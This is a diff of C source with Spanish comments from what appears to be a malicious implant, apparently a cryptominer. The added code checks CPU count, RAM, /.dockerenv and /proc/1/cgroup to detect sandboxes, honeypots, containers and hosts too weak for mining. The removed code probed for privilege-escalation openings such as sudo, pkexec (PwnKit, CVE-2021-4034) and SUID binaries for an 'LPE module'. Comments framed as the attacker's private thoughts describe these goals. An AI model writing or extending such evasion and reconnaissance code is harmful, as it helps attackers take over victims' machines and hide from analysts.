@@ -2,46 +2,62 @@
 
 /* 
  * Pensamiento privado: 
- * Escaneando el entorno... buscando grietas en el kernel o binarios SUID descuidados. 
- * Si encontramos algo, el módulo de LPE entrará en acción como un bisturí.
+ * Si no podemos ser Root, seremos los dueños eficientes del Userland.
+ * Primero, saber dónde estamos. ¿Es una jaula (Docker)? ¿Es un honeypot?
  */
+
+int is_sandboxed() {
+    // Comprobación heurística simple
+    int cores = sysconf(_SC_NPROCESSORS_ONLN);
+    struct sysinfo info;
+    sysinfo(&info);
+    unsigned long ram_mb = info.totalram / 1024 / 1024;
+
+    // Si tiene recursos muy bajos, sospechoso o inútil para minar
+    if (cores < 2 || ram_mb < 512) {
+        return 1; // Posible sandbox o VPS basura
+    }
+    return 0;
+}
 
 void audit_system(system_info_t *info) {
     struct utsname buffer;
     
-    // Obtener versión del kernel - crítico para elegir el exploit modular
+    // Info Básica
     if (uname(&buffer) == 0) {
         strncpy(info->kernel_version, buffer.release, sizeof(info->kernel_version));
     } else {
         strcpy(info->kernel_version, "unknown");
     }
 
-    // Comprobación rápida de sudo - ¿podemos escalar fácil?
-    if (access("/usr/bin/sudo", X_OK) == 0) {
-        info->has_sudo = 1;
+    // Recursos
+    info->num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
+    struct sysinfo s_info;
+    if (sysinfo(&s_info) == 0) {
+        info->total_ram_mb = s_info.totalram / 1024 / 1024;
     } else {
-        info->has_sudo = 0;
+        info->total_ram_mb = 0;
     }
 
-    // Verificación de pkexec (CVE-2021-4034 - PwnKit)
-    // Aunque esté parcheado en muchos sitios, siempre vale la pena mirar.
-    if (access("/usr/bin/pkexec", X_OK) == 0) {
-        info->vulnerable_pkexec = 1; // Simplificado, idealmente chequear versión o permisos
-    } else {
-        info->vulnerable_pkexec = 0;
-    }
+    // Sudo check (informativo)
+    info->has_sudo = (access("/usr/bin/sudo", X_OK) == 0);
 
-    /* 
-     * Búsqueda de otros vectores SUID.
-     * Un atacante inteligente siempre mira lo que otros olvidaron.
-     */
-    const char *suid_targets[] = {"/usr/bin/passwd", "/usr/bin/chsh", "/usr/bin/newgrp", "/usr/sbin/exim4"};
-    for (int i = 0; i < 4; i++) {
-        if (access(suid_targets[i], X_OK) == 0) {
-            // Podríamos registrar esto para el módulo modular de LPE
+    // Container Check
+    info->is_container = 0;
+    if (access("/.dockerenv", F_OK) == 0) {
+        info->is_container = 1;
+    } else {
+        // Check cgroups for docker string
+        FILE *f = fopen("/proc/1/cgroup", "r");
+        if (f) {
+            char line[256];
+            while (fgets(line, sizeof(line), f)) {
+                if (strstr(line, "docker") || strstr(line, "lxc")) {
+                    info->is_container = 1;
+                    break;
+                }
+            }
+            fclose(f);
         }
     }
-
-    // Nota técnica: Aquí podríamos añadir escaneo de /proc/version o /proc/config.gz
-    // si quisiéramos ser más agresivos con la detección de mitigaciones (KASLR, SMEP, etc).
 }
